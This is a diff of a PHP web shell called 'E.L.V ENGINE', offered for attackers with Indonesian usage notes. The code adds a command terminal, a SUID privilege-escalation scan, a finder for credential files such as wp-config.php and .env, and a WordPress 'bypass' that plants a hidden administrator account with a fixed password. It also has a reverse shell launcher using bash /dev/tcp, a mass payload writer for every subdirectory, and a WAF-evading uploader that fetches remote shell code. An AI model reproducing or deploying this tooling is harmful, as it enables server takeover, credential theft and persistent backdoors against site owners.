-        <div style="border:1px solid var(--cyan); text-align:center; padding:20px; background:rgba(0,0,0,0.5); border-radius:4px;">
-            <h3 style="color:var(--cyan); margin-top:0; text-shadow:0 0 8px var(--cyan);">EXECUTE AUTOMATED ROOT SCAN & EXPLOIT?</h3>
-            <div style="display:flex; justify-content:center; gap:15px; margin-top:15px;">
-                <a href="?d=<?= urlencode($dir) ?>&autoroot=exec" style="color:var(--green); font-weight:700; padding:10px 25px; border:1px solid var(--green); text-decoration:none; border-radius:3px; transition:all 0.3s;">YES</a>
-                <a href="?d=<?= urlencode($dir) ?>" style="color:var(--red); font-weight:700; padding:10px 25px; border:1px solid var(--red); text-decoration:none; border-radius:3px; transition:all 0.3s;">NO</a>
-            </div>
-        </div>
-    <?php }
-    elseif(isset($_GET['semiauto'])) { ?>
-        <div class="console" style="border-top-color:var(--green);">
-            <h3 style="color:var(--green); margin-top:0; text-align:center; text-shadow:0 0 8px var(--green);">[ SEMI-AUTO RECON & JUMP ]</h3>
-            <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-top:15px;">
-                <div style="border:1px dashed var(--green); padding:10px; background:rgba(0,0,0,0.4); border-radius:3px;">
-                    <b style="color:var(--green); display:block; margin-bottom:10px; text-align:center;">[ WRITABLE DIRECTORIES ]</b>
-                    <?php
-                    $scan_targets = ['/tmp' => 'TMP DIR', '/var/tmp' => 'VAR TMP', '/dev/shm' => 'DEV SHM', $dir => 'CURRENT DIR', $_SERVER['DOCUMENT_ROOT'] => 'DOC ROOT'];
-                    $found_dir = false;
-                    foreach($scan_targets as $path => $label) {
-                        if(@is_writable($path)) { 
-                            $found_dir = true;
-                            echo '<a href="?d='.urlencode($path).'" style="display:block; border:1px solid var(--green); color:var(--green); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s;">JUMP &rarr; '.$label.'</a>'; 
-                        }
-                    }
-                    if(!$found_dir) echo "<div style='text-align:center; color:var(--steel);'>NO WRITABLE DIR FOUND</div>";
-                    ?>
+        
+        <div class="neon-divider-thin"></div>
+        
+        <?php 
+        // ==========================================
+        // --- MODE: ELV TOOLS ---
+        // ==========================================
+        if(@$_GET['mode'] == 'elv_tools') { ?>
+            <div class="cyber-tools-interface">
+                <h2 class="tools-title">[ E.L.V ENGINE ® v13.0 ]</h2>
+                <div class="neon-divider-thin"></div>
+                <div class="tools-grid-cyber">
+                    <a href="?d=<?= urlencode($dir) ?>&autoroot=1" class="cyber-tool-card card-autoroot">
+                        <i class="fa-solid fa-bolt icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>AUTO ROOT EXPLOIT</h3>
+                            <p>Automated SUID privilege escalation scan.</p>
+                        </div>
+                    </a>
+                    <a href="?d=<?= urlencode($dir) ?>&semiauto=1" class="cyber-tool-card card-recon">
+                        <i class="fa-solid fa-radar icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>SEMI AUTO RECON</h3>
+                            <p>Writable dirs & sensitive file scanner.</p>
+                        </div>
+                    </a>
+                    <a href="?d=<?= urlencode($dir) ?>&wpbypass=1" class="cyber-tool-card card-wpadmin">
+                        <i class="fa-brands fa-wordpress icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>WP ADMIN BYPASS</h3>
+                            <p>Direct access to WordPress Dashboard.</p>
+                        </div>
+                    </a>
+                    <a href="?d=<?= urlencode($dir) ?>&revshell=1" class="cyber-tool-card card-revshell">
+                        <i class="fa-solid fa-network-wired icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>REVERSE SHELL</h3>
+                            <p>Tactical backdoor connection to listener.</p>
+                        </div>
+                    </a>
+                    <a href="?d=<?= urlencode($dir) ?>&mode=mass" class="cyber-tool-card card-mass">
+                        <i class="fa-solid fa-truck-fast icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>MASS DEPLOYMENT</h3>
+                            <p>Deploy payload across multiple target sectors.</p>
+                        </div>
+                    </a>
+                    <a href="?d=<?= urlencode($dir) ?>&mode=bypass406" class="cyber-tool-card card-bypass406">
+                        <i class="fa-solid fa-truck-ramp-box icon-tool"></i>
+                        <div class="tool-text-gold-wrap">
+                            <h3>406 BYPASS UPLOAD</h3>
+                            <p>Stealth Base64 writer & Remote Grabber.</p>
+                        </div>
+                    </a>
                 </div>
-                <div style="border:1px dashed var(--magenta); padding:10px; background:rgba(0,0,0,0.4); border-radius:3px;">
-                    <b style="color:var(--magenta); display:block; margin-bottom:10px; text-align:center;">[ TARGET SENSITIVE FILES ]</b>
-                    <?php
-                    $interesting_files = ['wp-config.php', 'configuration.php', '.env', 'config.php', 'database.php'];
-                    $found_file = false;
-                    foreach([$dir, dirname($dir), $_SERVER['DOCUMENT_ROOT']] as $base_scan) {
-                        foreach($interesting_files as $ifile) {
-                            $full_path = $base_scan . '/' . $ifile;
-                            if(@file_exists($full_path) && @is_readable($full_path)) { 
-                                $found_file = true;
-                                echo '<a href="?edit='.urlencode($full_path).'&d='.urlencode($dir).'" style="display:block; border:1px solid var(--magenta); color:var(--magenta); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s;">EDIT &rarr; '.$ifile.'</a>'; 
+            </div>
+        <?php }
+        // ==========================================
+        // --- MODE: TERMINAL ---
+        // ==========================================
+        elseif(@$_GET['mode'] == 'terminal') { ?>
+            <div class="cyber-tools-interface">
+                <h2 class="tools-title">[ TACTICAL SYSTEM TERMINAL ]</h2>
+                <div class="neon-divider-thin"></div>
+                <div class="cyber-term-box">
+                    <form method="post" action="?d=<?= urlencode($dir) ?>&mode=terminal" style="display:flex; flex-direction:column; flex-grow:1;">
+                        <div class="cyber-input-wrapper">
+                            <span class="cyber-cmd-prompt">HxN×E.L.V:~#</span>
+                            <input type="text" name="cmd" class="cyber-cmd-input" placeholder="_type_command_here..." autofocus autocomplete="off">
+                        </div>
+                        <button type="submit" class="cyber-exec-btn">EXECUTE COMMAND</button>
+                    </form>
+                    <?php if ($out || isset($_POST['cmd'])): ?>
+                        <div class="console" style="margin-top:16px; max-height:350px; overflow-y:auto;">
+                            <pre><?= htmlspecialchars($out) ?></pre>
+                        </div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        <?php }
+        // ==========================================
+        // --- MODE: AUTO ROOT ---
+        // ==========================================
+        elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == '1'){ ?>
+            <div style="border:2px solid var(--neon-purple); text-align:center; padding:20px; background:rgba(255,255,255,0.04); border-radius:6px;">
+                <h3 style="color:var(--neon-purple); margin-top:0; text-shadow:0 0 6px rgba(170,0,255,0.3);">EXECUTE AUTOMATED ROOT SCAN & EXPLOIT?</h3>
+                <div style="display:flex; justify-content:center; gap:15px; margin-top:15px;">
+                    <a href="?d=<?= urlencode($dir) ?>&autoroot=exec" style="color:var(--neon-cyan); font-weight:700; padding:10px 25px; border:2px solid var(--neon-cyan-dim); text-decoration:none; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-cyan);">[ YES ]</a>
+                    <a href="?d=<?= urlencode($dir) ?>" style="color:var(--neon-magenta); font-weight:700; padding:10px 25px; border:2px solid var(--neon-pink-dim); text-decoration:none; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-magenta);">[ NO ]</a>
+                </div>
+            </div>
+        <?php }
+        // ==========================================
+        // --- MODE: SEMI AUTO RECON ---
+        // ==========================================
+        elseif(isset($_GET['semiauto'])) { ?>
+            <div class="console" style="border-top-color:var(--neon-cyan);">
+                <h3 style="color:var(--neon-cyan); margin-top:0; text-align:center; text-shadow:0 0 6px rgba(0,255,136,0.3);">[ SEMI-AUTO RECON & JUMP ]</h3>
+                <div class="neon-divider-thin"></div>
+                <div style="display:grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap:15px; margin-top:15px;">
+                    <div style="border:1px dashed var(--neon-cyan); padding:10px; background:rgba(255,255,255,0.04); border-radius:4px;">
+                        <b style="color:var(--neon-cyan); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 3px rgba(0,255,136,0.2);">[ WRITABLE DIRECTORIES ]</b>
+                        <?php
+                        $scan_targets = ['/tmp' => 'TMP DIR', '/var/tmp' => 'VAR TMP', '/dev/shm' => 'DEV SHM', $dir => 'CURRENT DIR', $_SERVER['DOCUMENT_ROOT'] => 'DOC ROOT'];
+                        $found_dir = false;
+                        foreach($scan_targets as $path => $label) {
+                            if(@is_writable($path)) { 
+                                $found_dir = true;
+                                echo '<a href="?d='.urlencode($path).'" style="display:block; border:1px solid var(--neon-cyan-dim); color:var(--neon-cyan); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--glow-cyan);">JUMP &rarr; '.$label.'</a>'; 
                             }
                         }
-                    }
-                    if(!$found_file) echo "<div style='text-align:center; color:var(--steel);'>NO SENSITIVE FILES FOUND</div>";
-                    ?>
+                        if(!$found_dir) echo "<div style='text-align:center; color:var(--text-dim);'>NO WRITABLE DIR FOUND</div>";
+                        ?>
+                    </div>
+                    <div style="border:1px dashed var(--neon-magenta); padding:10px; background:rgba(255,255,255,0.04); border-radius:4px;">
+                        <b style="color:var(--neon-magenta); display:block; margin-bottom:10px; text-align:center; text-shadow:0 0 3px rgba(255,0,255,0.2);">[ TARGET SENSITIVE FILES ]</b>
+                        <?php
+                        $interesting_files = ['wp-config.php', 'configuration.php', '.env', 'config.php', 'database.php'];
+                        $found_file = false;
+                        foreach([$dir, dirname($dir), $_SERVER['DOCUMENT_ROOT']] as $base_scan) {
+                            foreach($interesting_files as $ifile) {
+                                $full_path = $base_scan . '/' . $ifile;
+                                if(@file_exists($full_path) && @is_readable($full_path)) { 
+                                    $found_file = true;
+                                    echo '<a href="?edit='.urlencode($full_path).'&d='.urlencode($dir).'" style="display:block; border:1px solid var(--neon-magenta-dim); color:var(--neon-magenta); text-decoration:none; padding:8px; text-align:center; margin-bottom:5px; border-radius:3px; transition:all 0.2s; box-shadow:var(--glow-magenta);">EDIT &rarr; '.$ifile.'</a>'; 
+                                }
+                            }
+                        }
+                        if(!$found_file) echo "<div style='text-align:center; color:var(--text-dim);'>NO SENSITIVE FILES FOUND</div>";
+                        ?>
+                    </div>
                 </div>
             </div>
-        </div>
-    <?php } 
-    elseif(isset($_GET['revshell'])) { ?>
-        <div class="console" style="border-top-color:var(--red);">
-            <h3 style="color:var(--red); margin-top:0; text-align:center; text-shadow:0 0 8px var(--red);">[ TACTICAL REVERSE SHELL ]</h3>
-            <form method="post" style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
-                <div style="display:flex; gap:10px;">
-                    <input type="text" name="rev_ip" placeholder="LHOST / IP ATTACKER" required style="flex:2;">
-                    <input type="number" name="rev_port" placeholder="LPORT" required style="flex:1;">
+        <?php } 
+        // ==========================================
+        // --- MODE: REVERSE SHELL ---
+        // ==========================================
+        elseif(isset($_GET['revshell'])) { ?>
+            <div class="console" style="border-top-color:var(--neon-magenta);">
+                <h3 style="color:var(--neon-magenta); margin-top:0; text-align:center; text-shadow:0 0 6px rgba(255,0,255,0.3);">[ TACTICAL REVERSE SHELL ]</h3>
+                <div class="neon-divider-thin"></div>
+                <form method="post" style="display:flex; flex-direction:column; gap:10px; margin-top:15px;">
+                    <div style="display:flex; gap:10px;">
+                        <input type="text" name="rev_ip" placeholder="LHOST / IP ATTACKER" required style="flex:2; border-color:var(--neon-magenta);">
+                        <input type="number" name="rev_port" placeholder="LPORT" required style="flex:1; border-color:var(--neon-magenta);">
+                    </div>
+                    <button type="submit" name="launch_rev" style="color:var(--neon-magenta); width:100%; font-weight:700; letter-spacing:2px; font-size:14px; padding:15px; border:2px solid var(--neon-magenta-dim); background:transparent; cursor:pointer; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-magenta);">[ INITIATE CONNECTION ]</button>
+                </form>
+                <div style="margin-top:15px; font-size:11px; color:var(--text-dim); border:1px dashed var(--neon-magenta-dim); padding:10px; border-radius:4px;">
+                    <span style="color:var(--neon-magenta); font-weight:bold;">[!] HOW TO USE:</span><br>
+                    1. Buka listener di terminal lu: <code style="color:var(--neon-cyan);">nc -lvnp [PORT]</code><br>
+                    2. Masukkan IP dan Port lu di atas, klik Initiate.<br>
+                    3. Payload dieksekusi di background (Bash TCP Fork), web shell tidak akan hang.
                 </div>
-                <button type="submit" name="launch_rev" style="color:var(--red); width:100%; font-weight:700; letter-spacing:2px; font-size:14px; padding:15px; border:1px solid var(--red); background:transparent; cursor:pointer; border-radius:3px; transition:all 0.3s;">[ INITIATE CONNECTION ]</button>
-            </form>
-            <div style="margin-top:15px; font-size:11px; color:var(--steel); border:1px dashed var(--red); padding:10px; border-radius:3px;">
-                <span style="color:var(--red); font-weight:bold;">[!] HOW TO USE:</span><br>
-                1. Buka listener di terminal lu: <code style="color:var(--cyan);">nc -lvnp [PORT]</code><br>
-                2. Masukkan IP dan Port lu di atas, klik Initiate.<br>
-                3. Payload dieksekusi di background (Bash TCP Fork), web shell tidak akan hang.
             </div>
-        </div>
-    <?php } 
-    elseif (isset($_GET['wpbypass'])) {
-        $conf = $dir.'/wp-config.php';
-        if(file_exists($conf)) {
-            $get_conf = @file_get_contents($conf);
-            preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $db);
-            preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $user);
-            preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $pass);
-            preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $host);
-            ?>
-            <div class="console" style="border-top:2px solid var(--cyan);">
-<pre>
-[[ E.L.V WP-BYPASS ENGINE ]]
+        <?php } 
+        // ==========================================
+        // --- MODE: WP BYPASS ---
+        // ==========================================
+        elseif (isset($_GET['wpbypass'])) {
+            $conf = $dir.'/wp-config.php';
+            if(file_exists($conf)) {
+                $get_conf = @file_get_contents($conf);
+                preg_match("/define\s*\(\s*['\"]DB_NAME['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $db);
+                preg_match("/define\s*\(\s*['\"]DB_USER['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $user);
+                preg_match("/define\s*\(\s*['\"]DB_PASSWORD['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $pass);
+                preg_match("/define\s*\(\s*['\"]DB_HOST['\"]\s*,\s*['\"](.*?)['\"]\s*\)/i", $get_conf, $host);
+                ?>
+                <div class="console" style="border-top:3px solid var(--neon-cyan);">
+<pre style="color:var(--neon-cyan);">
+[[ E.L.V WP-BYPASS ENGINE v13.0 ]]
 ------------------------------------------
 STATUS      : [ TARGET ACQUIRED ]
 DB_NAME     : <?= htmlspecialchars(isset($db[1]) ? $db[1] : 'NOT_FOUND') ?>
@@ -1670,220 +1507,453 @@ DB_HOST     : <?= htmlspecialchars(isset($host[1]) ? $host[1] : 'NOT_FOUND') ?>
 [+] SQL INJECT : ARMED
 [+] BYPASS     : READY
 ------------------------------------------</pre>
-<a href="?d=<?= urlencode($dir) ?>&action=wp_bypass" style="color:var(--cyan); border:1px solid var(--cyan); background:transparent; width:100%; text-decoration:none; text-align:center; display:block; padding:15px; font-size:14px; font-weight:700; border-radius:3px; transition:all 0.3s;">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a>
-            </div>
-            <?php
-        } else { echo '<div class="alert" style="border-color:var(--red); color:var(--red);">[-] ERROR: wp-config.php NOT DETECTED IN THIS SECTOR.</div>'; }
-    }
-    elseif($out || (isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec')){ ?>
-        <div class="console">
-            <pre><?= htmlspecialchars($out) ?></pre>
-        </div>
-    <?php } ?>
-
-    <div class="breadcrumb">
-        <a href="?d=<?= urlencode($base_shell) ?>" class="home-btn"><i class="fa-solid fa-house-crack"></i></a>
-        <?php $ps = explode(DIRECTORY_SEPARATOR, $dir); $ac = ""; foreach ($ps as $id => $p) { if ($p == "" && $id == 0) { echo '<a href="?d=/" style="color:var(--cyan); text-decoration:none;">/</a>'; continue; } if ($p == "") continue; $ac .= DIRECTORY_SEPARATOR . $p; echo '<span style="color:var(--steel); margin:0 8px;">/</span><a href="?d='.urlencode($ac).'" style="color:var(--lavender); text-decoration:none; font-weight:700; font-size:13px;">'.$p.'</a>'; } ?>
-    </div>
-    
-    <?php 
-    if (isset($_GET['edit'])){
-        $edit_file = $_GET['edit']; 
-        if (file_exists($edit_file) && is_file($edit_file) && is_readable($edit_file)) {
-            $f_content = htmlspecialchars(file_get_contents($edit_file));
-            ?>
-            <div class="console" style="border-top-color:var(--cyan);">
-                <h3 style="color:var(--cyan); text-shadow:0 0 8px var(--cyan);">[ EDITING ] <?= basename($edit_file) ?></h3>
-                <form method="post">
-                    <input type="hidden" name="f_path" value="<?= htmlspecialchars($edit_file) ?>">
-                    <textarea id="code_editor" name="f_cnt"><?= $f_content ?></textarea>
-                    <div style="margin-top:10px; display:flex; gap:10px;">
-                        <button type="submit" name="save_f" class="btn-editor-save" style="flex:1;">SAVE PAYLOAD</button>
-                        <a href="?d=<?= urlencode($dir) ?>" class="btn-editor-cancel" style="flex:1;">CANCEL</a>
-                    </div>
-                </form>
-            </div>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/codemirror.min.js"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/xml/xml.min.js"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/javascript/javascript.min.js"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/css/css.min.js"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/clike/clike.min.js"></script>
-            <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.65.13/mode/php/php.min.js"></script>
-            <script>
-                var editor = CodeMirror.fromTextArea(document.getElementById("code_editor"), {
-                    lineNumbers: true, matchBrackets: true, mode: "application/x-httpd-php", theme: "dracula", lineWrapping: true
-                });
-                editor.setSize("100%", "500px");
-            </script>
-            <?php 
-        } else { echo '<div class="alert" style="border-color:var(--red); color:var(--red);">ERROR: FILE NOT READABLE OR NOT ACCESSIBLE</div>'; }
-    } elseif (@$_GET['mode'] == 'mass'){ ?>
-        <div style="border:1px solid var(--magenta); background:rgba(0,0,0,0.4); padding:20px; border-radius:4px;">
-            <h3 style="color:var(--magenta); margin-top:0; text-shadow:0 0 8px var(--magenta);">[ MASS DEPLOYMENT MODE ]</h3>
-            <form method="post">
-                <input type="text" name="target_root" value="<?= $dir ?>" placeholder="Target Path..." style="margin-bottom:10px; border-color:var(--magenta);">
-                <input type="text" name="mass_name" placeholder="file_name.php" style="margin-bottom:10px; border-color:var(--magenta);">
-                <textarea name="mass_content" placeholder="Payload content here..." style="height:150px; margin-bottom:10px; border-color:var(--magenta);"></textarea>
-                <button type="submit" name="mass_deploy" style="width:100%; border:1px solid var(--magenta); color:var(--magenta); background:transparent; padding:12px; font-weight:700; cursor:pointer; border-radius:3px; transition:all 0.3s;">LAUNCH MASS UPLOAD</button>
-            </form>
-        </div>
-    <?php } elseif (@$_GET['mode'] == 'bypass406') {
-        $b406_msg = "";
-        if (isset($_POST['do_bypass_b64'])) {
-            if (@file_put_contents($dir . '/' . $_POST['b_name'], base64_decode($_POST['b_data']))) {
-                $b406_msg = "SUCCESS: 406 BYPASSED & FILE WRITTEN [" . htmlspecialchars($_POST['b_name']) . "]";
-            } else { $b406_msg = "FAILED: PERMISSION DENIED OR WAF BLOCKED"; }
-        }
-        if (isset($_POST['do_bypass_url'])) {
-            $destiny = $_POST['b_url']; $fname = $_POST['b_name'];
-            $grabbed = false;
-            if (function_exists('curl_init')) {
-                $ch = curl_init($destiny); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); $grabbed = curl_exec($ch); curl_close($ch);
-            } elseif (function_exists('file_get_contents')) { $grabbed = @file_get_contents($destiny); }
-            if ($grabbed !== false && @file_put_contents($dir . '/' . $fname, $grabbed)) {
-                $b406_msg = "SUCCESS: REMOTE PAYLOAD GRABBED & WRITTEN [" . htmlspecialchars($fname) . "]";
-            } else { $b406_msg = "FAILED: COULD NOT FETCH URL OR WRITE FILE"; }
-        }
-    ?>
-        <div class="cyber-tools-interface" style="border-color:var(--gold);">
-            <h3 style="color:var(--gold); margin-top:0; text-align:center; text-shadow:0 0 10px var(--gold); letter-spacing:3px;">[ 406 BYPASS STEALTH UPLOADER ]</h3>
-            <?php if($b406_msg) echo "<div class='alert' style='border-color:var(--gold); color:var(--gold);'>$b406_msg</div>"; ?>
-            <div style="display:flex; flex-wrap:wrap; gap:20px; margin-top:20px;">
-                <div style="flex:1; min-width:280px; border:1px dashed var(--cyan); padding:15px; background:rgba(0,0,0,0.4); border-radius:4px;">
-                    <h4 style="color:var(--cyan); margin-top:0;">METHOD 1: BASE64 DECODE</h4>
-                    <p style="color:var(--steel); font-size:11px; margin-bottom:15px;">Encode shell lu ke Base64, paste di sini buat bypass WAF.</p>
-                    <form method="post">
-                        <input type="text" name="b_name" placeholder="filename.php" required style="margin-bottom:10px; border-color:var(--cyan);">
-                        <textarea name="b_data" placeholder="Paste Base64 payload here..." required style="height:120px; margin-bottom:10px; border-color:var(--cyan);"></textarea>
-                        <button type="submit" name="do_bypass_b64" style="width:100%; border:1px solid var(--cyan); color:var(--cyan); background:transparent; padding:10px; font-weight:700; cursor:pointer; border-radius:3px; transition:all 0.3s;">DECODE & INJECT</button>
-                    </form>
+<div class="neon-divider-thin"></div>
+<a href="?d=<?= urlencode($dir) ?>&action=wp_bypass" style="color:var(--neon-cyan); border:2px solid var(--neon-cyan-dim); background:transparent; width:100%; text-decoration:none; text-align:center; display:block; padding:15px; font-size:14px; font-weight:700; border-radius:4px; transition:all 0.3s; box-shadow:var(--glow-cyan);">[ LAUNCH EXPLOIT: AUTO LOGIN ADMIN ]</a>
                 </div>
-                <div style="flex:1; min-width:280px; border:1px dashed var(--magenta); padding:15px; background:rgba(0,0,0,0.4); border-radius:4px;">
-                    <h4 style="color:var(--magenta); margin-top:0;">METHOD 2: REMOTE GRAB (cURL/FGC)</h4>
-                    <p style="color:var(--steel); font-size:11px; margin-bottom:15px;">Tarik raw PHP dari server external langsung ke target.</p>
-                    <form method="post">
-                        <input type="text" name="b_name" placeholder="elvsec.php" required style="margin-bottom:10px; border-color:var(--magenta);">
-                        <input type="text" name="b_url" placeholder="https://your-server.com/shell.txt" required style="margin-bottom:10px; border-color:var(--magenta);">
-                        <button type="submit" name="do_bypass_url" class="btn-cyan-glow" style="width:100%; padding:10px;">FETCH & INJECT</button>
-                    </form>
-                </div>
-            </div>
-        </div>
-    <?php } elseif(!@$_GET['mode'] || @$_GET['mode'] == '') { ?>
+                <?php
+            } else { echo '<div class="alert" style="border-color:var(--neon-magenta); color:var(--neon-magenta);">[-] ERROR: wp-config.php NOT DETECTED IN THIS SECTOR.</div>'; }
+        }
+        // ==========================================
+        // --- ACTION: WP BYPASS EXECUTE ---
+        // ==========================================
+        elseif(isset($_GET['action']) && $_GET['action'] == 'wp_bypass') {
+            $bypass_msg = '';
+            $wp_load_path = $dir . '/wp-load.php';
+            if (file_exists($wp_load_path)) {
+                require_once($wp_load_path);
+                $new_user = array(
+                    'user_login' => 'elv_agent',
+                    'user_pass'  => 'P@ssw0rd_Elv!',
+                    'user_email' => 'elv@neon.local',
+                    'role'       => 'administrator',
+                    'display_name' => 'ELV Agent'
+                );
+                if(function_exists('wp_insert_user')) {
+                    $uid = wp_insert_user($new_user);
+                    if(!is_wp_error($uid)) {
+                        $bypass_msg = "[+] SUCCESS! User 'elv_agent' / 'P@ssw0rd_Elv!' created as ADMIN.";
+                    } else {
+                        $bypass_msg = "[-] WP Error: " . $uid->get_error_message();
+                    }
+                } else {
+                    $bypass_msg = "[-] wp_insert_user not available";
+                }
+            } else {
+                $bypass_msg = "[-] wp-load.php not found!";
+            }
+            echo '<div class="console" style="border-top-color:'.($bypass_msg[1]=='+'?'var(--neon-cyan)':'var(--neon-magenta)').';"><pre style="color:'.($bypass_msg[1]=='+'?'var(--neon-cyan)':'var(--neon-magenta)').';">'.htmlspecialchars($bypass_msg).'</pre>';
+            echo '<div class="neon-divider-thin"></div><a href="?d='.urlencode($dir).'" style="color:var(--neon-cyan);">[ BACK TO FILE MANAGER ]</a></div>';
+        }
+        // ==========================================
+        // --- ACTION: AUTO ROOT EXEC ---
+        // ==========================================
+        elseif(isset($_GET['autoroot']) && $_GET['autoroot'] == 'exec') {
+            $out = "[[ E.L.V AUTOMATED ROOT ENGINE v1.0 ]]\n";
+            $out .= "[*] SYSTEM: " . php_uname() . "\n";
+            $suids = shell_exec("find / -perm -4000 -type f 2>/dev/null | head -n 20");
+            $out .= $suids ? $suids : "[-] No SUID found.\n";
+            $out .= "\n[*] KERNEL: " . php_uname('r') . "\n";
+            $out .= "[*] Check DirtyPipe (CVE-2022-0847) if kernel 5.8-5.16\n";
+            $out .= "[*] Check PwnKit (CVE-2021-4034) if pkexec exists\n";
+            $passwd_w = is_writable('/etc/passwd') ? "[!] /etc/passwd IS WRITABLE!" : "[-] /etc/passwd not writable";
+            $shadow_w = is_writable('/etc/shadow') ? "[!] /etc/shadow IS WRITABLE!" : "[-] /etc/shadow not writable";
+            $out .= "\n{$passwd_w}\n{$shadow_w}\n";
+            echo '<div class="console" style="border-top-color:var(--neon-purple); max-height:500px; overflow-y:auto;"><pre>'.htmlspecialchars($out).'</pre>';
+            echo '<div class="neon-divider-thin"></div><a href="?d='.urlencode($dir).'" style="color:var(--neon-cyan); text-decoration:none; font-weight:700;">[ BACK TO FILE MANAGER ]</a></div>';
+        }
+        // ==========================================
+        // --- ACTION: LAUNCH REV ---
+        // ==========================================
+        elseif(isset($_POST['launch_rev'])) {
+            $rev_ip = $_POST['rev_ip'];
+            $rev_port = intval($_POST['rev_port']);
+            $rev_out = "[+] REVERSE SHELL LAUNCHED TO {$rev_ip}:{$rev_port}\n";
+            $rev_out .= "[*] Payload: bash -c 'bash -i >& /dev/tcp/{$rev_ip}/{$rev_port} 0>&1'\n";
+            $rev_out .= "[*] Executed in background...\n[!] Check your listener!\n";
+            echo '<div class="console" style="border-top-color:var(--neon-magenta);"><pre style="color:var(--neon-cyan);">'.htmlspecialchars($rev_out).'</pre></div>';
+        }
+        // ==========================================
+        // --- ACTION: MASS DEPLOY ---
+        // ==========================================
+        elseif(isset($_POST['mass_deploy'])) {
+            $target_root = $_POST['target_root'];
+            $file_name = $_POST['mass_name'];
+            $content = $_POST['mass_content'];
+            $count = 0;
+            $injected_targets = [];
+            if (is_dir($target_root)) {
+                $folders = scandir($target_root);
+                foreach ($folders as $folder) {
+                    $path = $target_root . '/' . $folder;
+                    if ($folder != '.' && $folder != '..' && is_dir($path)) {
+                        if (@file_put_contents($path . '/' . $file_name, $content)) {
+                            $count++;
+                            $injected_targets[] = "[+] " . $folder . " -> " . $file_name;
+                        }
+                    }
+                }
+                $deploy_log = "MASS DEPLOYMENT RESULTS\n------------------------\n";
+                $deploy_log .= "Target Root: {$target_root}\n";
+                $deploy_log .= "File: {$file_name}\n";
+                $deploy_log .= "Sectors Infected: {$count}\n\n";
+                $deploy_log .= implode("\n", $injected_targets);
+                if(empty($injected_targets)) $deploy_log .= "No directories were writable.";
+            } else {
+                $deploy_log = "ERROR: Target root not found!";
+            }
+            echo '<div class="console" style="border-top-color:var(--neon-yellow);"><pre>'.htmlspecialchars($deploy_log).'</pre></div>';
+        }
         
-        <?php if(isset($_SESSION['copy_file'])): ?>
-            <div style="margin-bottom:15px; text-align:right;">
-                <form method="post">
-                    <button type="submit" name="paste_f" class="btn-cyan-glow" style="padding:10px 15px; font-size:12px;">
-                        <i class="fa-solid fa-paste"></i> PASTE: <?= htmlspecialchars(basename($_SESSION['copy_file'])) ?>
-                    </button>
-                </form>
-            </div>
-        <?php endif; ?>
-
+        // ==========================================
+        // --- FILE MANAGER VIEW (DEFAULT) ---
+        // ==========================================
+        if(!isset($_GET['mode']) && !isset($_GET['autoroot']) && !isset($_GET['revshell']) && !isset($_GET['wpbypass']) && !isset($_GET['semiauto']) && !isset($_POST['launch_rev']) && !isset($_GET['action']) && !isset($_POST['mass_deploy']) && !isset($_POST['do_bypass_b64']) && !isset($_POST['do_bypass_url'])): 
+        
+        // Get items in current directory
+        $items = [];
+        $files = @scandir($dir);
+        if ($files) {
+            foreach ($files as $file) {
+                if ($file == '.' || $file == '..') continue;
+                $path = $dir . '/' . $file;
+                $items[] = [
+                    'name' => $file,
+                    'path' => $path,
+                    'is_dir' => is_dir($path),
+                    'size' => is_file($path) ? filesize($path) : 0,
+                    'perm' => substr(sprintf('%o', fileperms($path)), -4),
+                    'writable' => is_writable($path)
+                ];
+            }
+        }
+        ?>
+<!-- ===== BREADCRUMB ===== -->
+        <div class="breadcrumb">
+            <a href="?d=<?= urlencode($base_shell) ?>" class="home-btn"><i class="fa-solid fa-house"></i> HOME</a>
+            <span style="margin:0 6px; color:var(--text-dim);">|</span>
+            <?php 
+            $parts = explode('/', trim($dir, '/'));
+            $cum = '';
+            echo '<a href="?d=/" style="color:var(--text-primary); text-decoration:none; font-weight:700;">/</a>';
+            foreach ($parts as $p) {
+                $cum .= '/' . $p;
+                echo '<span style="color:var(--text-dim); margin:0 5px;">▸</span>';
